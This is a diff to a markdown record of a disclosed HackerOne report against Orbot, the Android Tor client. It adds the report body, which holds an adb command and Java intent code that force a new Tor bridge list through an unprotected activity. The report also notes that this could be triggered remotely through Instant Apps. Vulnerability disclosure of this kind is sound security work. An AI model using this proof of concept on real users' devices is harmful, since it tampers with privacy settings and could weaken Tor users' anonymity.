@@ -9,6 +9,7 @@ tags:
 substate: "informative"
 weakness: "Forced Browsing"
 enriched: true
+body: true
 date: 2017-08-21
 submitted: 2017-07-22T20:32:06.453Z
 bounty_usd: null
@@ -26,6 +27,27 @@ title: "[Android org.torproject.android] Possible to force list of bridges"
 - Report: [https://hackerone.com/reports/252626](https://hackerone.com/reports/252626)
 - CWE: Forced Browsing
 - Submitted: 2017-07-22T20:32:06.453Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+Do the following thing from ADB to emulate the activity start:
+```
+adb am start -n org.torproject.android/.OrbotMainActivity -a android.intent.action.VIEW -d bridge://xxx
+```
+
+Or create a malware app with the following code:
+```java
+        Intent intent = new Intent("android.intent.action.VIEW");
+        intent.setClassName("org.torproject.android", "org.torproject.android.OrbotMainActivity");
+        intent.setData(Uri.parse("bridge://xxx"));
+        startActivity(intent);
+```
+
+And new list of bridges will be applied (notification will be shown and new value will be added to shared_prefs).
+
+It's dangerous because any not authorized app (third party app) installed on the same device will be able to modify settings. On the newest Android devices this not authozed change can be done remotely from any web-browser using Instant Apps (app that doesn't require install to execute any code).
 
 ## Timeline
 
